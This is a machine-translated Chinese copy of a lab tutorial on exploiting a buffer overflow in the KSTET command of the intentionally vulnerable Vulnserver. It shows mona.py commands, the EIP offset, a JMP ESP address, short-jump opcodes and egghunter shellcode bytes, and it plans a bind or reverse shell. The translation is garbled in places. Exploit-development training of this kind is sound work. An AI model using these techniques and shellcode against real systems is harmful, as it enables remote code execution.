<html>
<head>
<title>[ExpDev] Vulnserver — Part 4</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Vulnserver —第4部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-vulnserver-part-4-a5529731f0f1?source=collection_archive---------3-----------------------#2020-07-20">https://infosecwriteups.com/expdev-vulnserver-part-4-a5529731f0f1?source=collection_archive---------3-----------------------#2020-07-20</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/91689a2d363626d78a5015cfb309aea8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*oIgnSebVGPK1tEAz.png"/></div></figure><h1 id="c38c" class="jx jy it bd jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">Vulnserver —第4部分(KSTET — EIP覆盖)</h1><p id="2909" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">这将是第四个<code class="fe lt lu lv lw b">vulnserver</code>漏洞系列。这次我们将模糊和利用易受攻击的命令<code class="fe lt lu lv lw b">KSTET</code>。我们将用一个普通的<code class="fe lt lu lv lw b">EIP</code>覆盖来识别一个崩溃点。然后，我们将利用矮个子JMP和Egghunter从受限空间逃到更大的土地，以介绍我们的外壳代码，最终获得绑定外壳。我们开始吧！</p><h1 id="344a" class="jx jy it bd jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">实验室环境</h1><ul class=""><li id="071f" class="lx ly it kx b ky kz lc ld lg lz lk ma lo mb ls mc md me mf bi translated"><strong class="kx iu">操作系统:</strong> Windows 7 (x86)</li><li id="3a09" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls mc md me mf bi translated"><strong class="kx iu">调试器:</strong> OllyDbg，WinDbg (mona.py)</li><li id="f74f" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls mc md me mf bi translated"><strong class="kx iu">模糊器:</strong>模糊器</li><li id="ffbc" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls mc md me mf bi translated"><strong class="kx iu">目标:</strong> Vulnserver — <code class="fe lt lu lv lw b">KSTET</code>命令(EIP覆盖)</li></ul><p id="fcb4" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">详细的实验室设置指南可在<a class="ae mq" href="https://medium.com/@bigb0ss/expdev-vulnserver-part-1-ba35b9e36478" rel="noopener">这里</a>找到</p><ul class=""><li id="c7bd" class="lx ly it kx b ky ml lc mm lg mr lk ms lo mt ls mc md me mf bi translated">"<strong class="kx iu">Vulnserver—第一部分</strong>"</li></ul></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h1 id="905b" class="jx jy it bd jz ka nb kc kd ke nc kg kh ki nd kk kl km ne ko kp kq nf ks kt ku bi translated">初步侦察</h1><p id="1018" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">让我们快速检查一下<code class="fe lt lu lv lw b">KSTET</code>命令是做什么的。</p><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/038d6b4488ac609cfd28a5af0e528e34.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CIaeFMdFd66C18jaAtIVDg.png"/></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">KSTET命令</figcaption></figure></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h1 id="5d97" class="jx jy it bd jz ka nb kc kd ke nc kg kh ki nd kk kl km ne ko kp kq nf ks kt ku bi translated">起毛</h1><p id="8116" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">因为我们已经有了之前在第1部分中创建的模糊化脚本，我们可以为<code class="fe lt lu lv lw b">KSTET</code>命令的模糊化器做一些小的改动。</p><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div class="gh gi no"><img src="../Images/2baa931854ea98576d3c4deb4f758da1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1148/format:webp/1*HDkH0y657qyyzGIs--x0dQ.png"/></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">来源:<a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/KSTET%20-%20EIP%20Overwrite/fuzz_kstet.py" rel="noopener ugc nofollow" target="_blank">fuzz _ kstet . py by bigboss</a></figcaption></figure><p id="8a4a" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">像往常一样，让我们用OllyDbg连接<code class="fe lt lu lv lw b">vulnserver</code>。然后，运行我们的fuzzer。</p><pre class="ng nh ni nj gt np lw nq nr aw ns bi"><span id="96f8" class="nt jy it lw b gy nu nv l nw nx"><strong class="lw iu">### Running the Fuzzer</strong><br/>C:\Users\bigb0ss\Desktop\scripts\KSTET&gt;python fuzz_kstet.py</span></pre><p id="f7a9" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">运行我们的fuzzing脚本几秒钟后，<code class="fe lt lu lv lw b">vulnserver</code>崩溃了。从OllyDbg的崩溃中，我们可以清楚地看到<code class="fe lt lu lv lw b">KSTET</code>命令和一定数量的字符导致了崩溃。</p><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nz oa di ob bf oc"><div class="gh gi ny"><img src="../Images/aca89687dda7ffeee27737c422dd07b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d8w2OWuFiosR94I-UD6fwA.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">初始碰撞</figcaption></figure></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="8c6d" class="nt jy it bd jz od oe dn kd of og dp kh lg oh oi kl lk oj ok kp lo ol om kt on bi translated">模糊分析</h2><p id="840a" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">从OllyDbg上的崩溃来看，大约有94个字符导致了KSTET命令的崩溃。这次我们将跳过Boofuzz DB文件分析。</p></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h1 id="6b50" class="jx jy it bd jz ka nb kc kd ke nc kg kh ki nd kk kl km ne ko kp kq nf ks kt ku bi translated">剥削</h1><h2 id="db1c" class="nt jy it bd jz od oe dn kd of og dp kh lg oh oi kl lk oj ok kp lo ol om kt on bi translated">初始崩溃概念验证</h2><p id="908b" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">让我们创建一个python脚本来重现崩溃。</p><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/3db9d290af634c1e4468c93f1f941b55.png" data-original-src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*gfFZbcqjlfAuSoOuo6g28w.png"/></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">来源:<a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/KSTET%20-%20EIP%20Overwrite/crash_kstet.py" rel="noopener ugc nofollow" target="_blank">crash _ kstet . py by bigboss</a></figcaption></figure><p id="3ae6" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">启动<code class="fe lt lu lv lw b">vulnserver</code>并将其连接到OllyDbg。然后，运行<code class="fe lt lu lv lw b">crash_kstet.py</code>脚本。我们成功地用PoC脚本重现了崩溃。</p><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nz oa di ob bf oc"><div class="gh gi op"><img src="../Images/5993ad8520e370d04df60b51ac565bec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oCI2xaXZavggBktrjf4vIg.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">再现车祸</figcaption></figure></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="f01f" class="nt jy it bd jz od oe dn kd of og dp kh lg oh oi kl lk oj ok kp lo ol om kt on bi translated">寻找偏移</h2><p id="05aa" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">我们的下一步是找到一个偏移量来控制<code class="fe lt lu lv lw b">EIP</code>崩溃时的时间。我们首先需要创建94个独特的角色。我们将使用WinDbg和mona.py的<code class="fe lt lu lv lw b">pattern_create</code>模块来完成这项工作。</p><p id="f2a2" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">运行WinDbg后，键入以下命令来加载python模块并创建模式。</p><pre class="ng nh ni nj gt np lw nq nr aw ns bi"><span id="cd3b" class="nt jy it lw b gy nu nv l nw nx"><strong class="lw iu">### Loading Python Extension of WinDbg</strong><br/>.load pykd.pyd</span><span id="7d01" class="nt jy it lw b gy oq nv l nw nx"><strong class="lw iu">### Mona.py Pattern_create</strong><br/>!py mona pattern_create 94</span></pre><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nz oa di ob bf oc"><div class="gh gi or"><img src="../Images/f0eda975b58a7a59fd4f990d133c531e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oInub5mR9uZ3BGQXvujukA.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">WinDgb + mona.py模式_创建</figcaption></figure><p id="9211" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">让我们用创建的模式更新我们的PoC脚本，并针对<code class="fe lt lu lv lw b">vulnserver</code>再次运行脚本。</p><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div class="gh gi os"><img src="../Images/8a1e485c098a981e08dd3f03b790a9a0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1164/format:webp/1*1sDRX8lxdNc5C3OCfZ2wBw.png"/></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">来源:<a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/KSTET%20-%20EIP%20Overwrite/pattern_kstet.py" rel="noopener ugc nofollow" target="_blank">pattern _ kstet . py by bigboss</a></figcaption></figure><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nz oa di ob bf oc"><div class="gh gi ot"><img src="../Images/b250b36fbb6d1dda1073985134212523.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2cjT-fsfZlR5wpZPE5zH0Q.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">Pattern_kstet.py结果</figcaption></figure><p id="ec95" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated"><code class="fe lt lu lv lw b">EIP</code>现在被值<code class="fe lt lu lv lw b">63413363</code>覆盖。让我们再次使用mona.py来查找偏移量。这一次，我们将使用名为<code class="fe lt lu lv lw b">pattern_offset</code>的模块。</p><pre class="ng nh ni nj gt np lw nq nr aw ns bi"><span id="7df7" class="nt jy it lw b gy nu nv l nw nx"><strong class="lw iu">### Mona.py Pattern_offset</strong><br/>!py mona pattern_offset 63413363</span></pre><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nz oa di ob bf oc"><div class="gh gi ou"><img src="../Images/718b5ed0d0bbb924a09db4209c370f9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0Po5-XyUDNIVK9tcETS-PQ.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">偏移= 70°</figcaption></figure><p id="9a22" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">它发现偏移量为70。让我们再次更新我们的PoC脚本，并通过对<code class="fe lt lu lv lw b">vulnserver</code>运行它来确认偏移。</p></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="e5cd" class="nt jy it bd jz od oe dn kd of og dp kh lg oh oi kl lk oj ok kp lo ol om kt on bi translated">确认偏移</h2><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div class="gh gi ov"><img src="../Images/78202d640a84bbea779f7fcf0c304dff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1152/format:webp/1*MtMhQiQgcENA3jv7uEoVJA.png"/></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">来源:<a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/KSTET%20-%20EIP%20Overwrite/offset_kstet.py" rel="noopener ugc nofollow" target="_blank">offset _ kstet . py by bigb0ss</a></figcaption></figure><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nz oa di ob bf oc"><div class="gh gi ow"><img src="../Images/693db096e34ee21511c2144f62d992ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UJlJy7N4lRTiqb7xx6fIPA.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">确认偏移</figcaption></figure><p id="82e0" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">这种偏移确实是正确的。现在，我们都准备好在碰撞时控制<code class="fe lt lu lv lw b">EIP</code>。</p></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h1 id="7cc2" class="jx jy it bd jz ka nb kc kd ke nc kg kh ki nd kk kl km ne ko kp kq nf ks kt ku bi translated">检查不良字符</h1><p id="5115" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">接下来，让我们检查<code class="fe lt lu lv lw b">KSTET</code>命令是否有不良或受限字符。我们将使用mona.py的<code class="fe lt lu lv lw b">bytearray</code>命令创建一个从<code class="fe lt lu lv lw b">\x01</code>到<code class="fe lt lu lv lw b">\xFF</code>的字节列表(<code class="fe lt lu lv lw b">\x00</code> = null terminator通常是一个坏字符，因此我们可以在生成带有<code class="fe lt lu lv lw b">-cpb</code>标志的列表时排除它)。一旦我们生成了<code class="fe lt lu lv lw b">bytearray</code>的列表，我们需要将它们分成几个卡盘，因为我们在偏移量内只有大约70字节的空间来测试它们的每次崩溃。</p><pre class="ng nh ni nj gt np lw nq nr aw ns bi"><span id="2106" class="nt jy it lw b gy nu nv l nw nx"><strong class="lw iu">### Mona.py Bytearray</strong><br/>!py mona.py bytearray -cpb \x00</span><span id="5054" class="nt jy it lw b gy oq nv l nw nx"><strong class="lw iu">bad_chars_1</strong> = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"</span><span id="cde1" class="nt jy it lw b gy oq nv l nw nx"><strong class="lw iu">bad_chars_2</strong> = "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"</span><span id="14cb" class="nt jy it lw b gy oq nv l nw nx"><strong class="lw iu">bad_chars_3</strong> = "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span id="dcba" class="nt jy it lw b gy oq nv l nw nx"><strong class="lw iu">bad_chars_</strong>4 = "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span></pre><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nz oa di ob bf oc"><div class="gh gi ox"><img src="../Images/591e816faa47eda5220cf2bd7c2dc7f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ApFOEOiueVFURjW0B1liew.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">来源:<a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/KSTET%20-%20EIP%20Overwrite/badchar_kstet.py" rel="noopener ugc nofollow" target="_blank">bad char _ kstet . py by bigb0ss</a></figcaption></figure><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nz oa di ob bf oc"><div class="gh gi oy"><img src="../Images/1c5bec5885340eeb9effb01418991578.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KGcT3bM2LFzVbgq05y6Atg.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">检查不良字符(例如“bad_chars_1”)</figcaption></figure><p id="d273" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">对每个bad_chars_1 ~ 4做这个步骤。一旦完成，没有坏的字符会被发现。</p></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="2250" class="nt jy it bd jz od oe dn kd of og dp kh lg oh oi kl lk oj ok kp lo ol om kt on bi translated">寻找JMP</h2><p id="2147" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">作为一个常见的<code class="fe lt lu lv lw b">EIP</code>重写BOF漏洞，我们现在需要在应用程序中找到一个<code class="fe lt lu lv lw b">JMP ESP</code>指令。</p><p id="59ff" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">这次让我们将vulnserver附加到WinDbg，这样我们就可以使用mona.py在应用程序的dll中找到<code class="fe lt lu lv lw b">JMP ESP</code>。我们将再次使用<code class="fe lt lu lv lw b">-cpb</code>标志来排除任何包含<code class="fe lt lu lv lw b">\x00</code>的地址。(默认情况下，它还会在非ASLR或非Rebase模块中进行搜索。)</p><pre class="ng nh ni nj gt np lw nq nr aw ns bi"><span id="8348" class="nt jy it lw b gy nu nv l nw nx"><strong class="lw iu">### Loading Python Extension of WinDbg</strong><br/>.load pykd.pyd</span><span id="c5d7" class="nt jy it lw b gy oq nv l nw nx"><strong class="lw iu">### Mona.py Finding JMP ESP</strong><br/>!py mona jmp -r esp -cpb '\x00'</span></pre><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nz oa di ob bf oc"><div class="gh gi oz"><img src="../Images/b3b9b5144cdce843dbc3bc163d728ae9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7Z-aZDuR2q8Pp_05jMMHDQ.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">寻找JMP ESP</figcaption></figure><p id="1e13" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">让我们使用其中一个地址<code class="fe lt lu lv lw b">0x62501205</code>，并更新我们的PoC脚本。并再次将vulnserver附加到OllyDbg，在<code class="fe lt lu lv lw b">0x62501205</code> ( <code class="fe lt lu lv lw b">JMP ESP</code>)地址设置一个断点。</p><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div class="gh gi pa"><img src="../Images/a3fef48f516571f40109b7614dd2c478.png" data-original-src="https://miro.medium.com/v2/resize:fit:988/format:webp/1*1tjdoK0dVakzTU24Z9_aaA.png"/></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">JMP ESP处的断点</figcaption></figure><p id="3d5e" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">当我们运行PoC脚本时，我们确实找到了<code class="fe lt lu lv lw b">JMP ESP</code>地址和断点。</p><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div class="gh gi pb"><img src="../Images/7c050e69c5c1834c0913b3eb14fd72c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1318/format:webp/1*cXfVlHR2OMgIiS_6aXkmgg.png"/></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">来源:<a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/KSTET%20-%20EIP%20Overwrite/jmp-esp_kstet.py" rel="noopener ugc nofollow" target="_blank">jmp-esp _ kstet . py by bigboss</a></figcaption></figure><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nz oa di ob bf oc"><div class="gh gi pc"><img src="../Images/246e0f3b68b3c27af05cb0fe59f20734.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6eb89DT1A6sKfOlSKLKBUg.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">JMP ESP ( <code class="fe lt lu lv lw b">0x62501205</code>)</figcaption></figure><p id="17e9" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">当我们按下<code class="fe lt lu lv lw b">F7</code>来步进指令时，我们成功地跳到了<code class="fe lt lu lv lw b">ESP</code>，但是我们遇到了一个问题。我们只有14字节的可用空间。</p><p id="e3d7" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">这是我们的攻击计划:</p><p id="49bd" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated"><strong class="kx iu">【第一阶段外壳代码】</strong>利用14字节的空间引入第一阶段外壳代码，将JMP缩短到上面带有“A”的更大空间</p><p id="e15a" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated"><strong class="kx iu">【第二阶段外壳代码】</strong>接下来，在“A”空间内引入Egghunter，以便再次跳转到更大的空间。</p><p id="4a81" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated"><strong class="kx iu">【第三阶段外壳代码】</strong>最后，在更大的篇幅内介绍绑定/反向外壳代码。</p></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="a80a" class="nt jy it bd jz od oe dn kd of og dp kh lg oh oi kl lk oj ok kp lo ol om kt on bi translated">第一阶段外壳代码(短JMP)</h2><p id="5039" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">目前<code class="fe lt lu lv lw b">EAX</code>寄存器保存我们的70字节空间的有效载荷的开始。我们将引入一个基本操作码，将大约<code class="fe lt lu lv lw b">0x6</code>添加到<code class="fe lt lu lv lw b">EAX</code>并跳转到<code class="fe lt lu lv lw b">EAX</code>。让我们在<code class="fe lt lu lv lw b">JMP ESP</code>指令后添加以下操作码。</p><pre class="ng nh ni nj gt np lw nq nr aw ns bi"><span id="0c60" class="nt jy it lw b gy nu nv l nw nx"><strong class="lw iu">### JMP Back Opcode</strong><br/>ADD EAX, 0x6<br/>JMP EAX</span></pre><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/161f133e87f375abb9cd88f1927582a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:920/format:webp/1*oBsrgHc8WyjTlWwYLHYHeQ.png"/></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">JMP返回操作码</figcaption></figure><p id="a3d9" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">一旦我们跳过指令，我们将成功地跳到我们控制的“A”位置。</p><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nz oa di ob bf oc"><div class="gh gi pe"><img src="../Images/5b18b77cf3102d3f07d6d71ec669c12a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*13yG9xra1JBAooTCKYOQ2Q.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">JMP回来了</figcaption></figure><p id="e652" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated"><em class="pf">*这里的一个提示是，从OllyDbg中，我们可以简单地二进制复制我们编写的操作码，以便在我们的漏洞利用脚本中使用它们。</em></p><p id="0099" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">让我们用第一阶段外壳代码更新我们的PoC脚本。</p><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div class="gh gi pg"><img src="../Images/5d49d2c0472800c77bd3e23d0845fdc8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1266/format:webp/1*JzKlJqUqqFcXTQdOOJ8kjA.png"/></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">来源:<a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/KSTET%20-%20EIP%20Overwrite/first_stage_kstet.py" rel="noopener ugc nofollow" target="_blank">first _ stage _ kstet . py by bigboss</a></figcaption></figure></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="2c44" class="nt jy it bd jz od oe dn kd of og dp kh lg oh oi kl lk oj ok kp lo ol om kt on bi translated">第二阶段外壳代码(Egghunter)</h2><p id="66c8" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">对于短JMP，我们现在降落在更大的空间，我们有大约70字节的自由空间。让我们为我们的第二阶段外壳代码添加Egghunter。</p><p id="94bd" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">基本上Egghunter要做的是，只要我们把我们选择的egg(例如，<code class="fe lt lu lv lw b">W00T</code>)放到堆栈上，Egghunter就会迭代内存空间来寻找我们的egg并跳转到那里。这是非常性感的技巧，也是从受限空间逃到更大空间的简单方法。让我们使用mona.py的<code class="fe lt lu lv lw b">egg</code>命令创建Egghunter外壳代码。</p><pre class="ng nh ni nj gt np lw nq nr aw ns bi"><span id="c203" class="nt jy it lw b gy nu nv l nw nx"><strong class="lw iu">### Mona.py Generating Egghunter</strong><br/>!py mona egg -t T00W             <strong class="lw iu"># "-t" for your choice of the egg</strong></span><span id="1660" class="nt jy it lw b gy oq nv l nw nx">[+] Egg set to b0ss<br/>[+] Generating traditional 32bit egghunter code<br/>[+] Preparing output file 'egghunter.txt'<br/>    - (Re)setting logfile egghunter.txt<br/><strong class="lw iu">[+] Egghunter  (33 bytes): <br/>"\x90\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"<br/>"\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff"<br/>"\xe7"</strong></span></pre><p id="2959" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">然而，这样做的一个问题是在<code class="fe lt lu lv lw 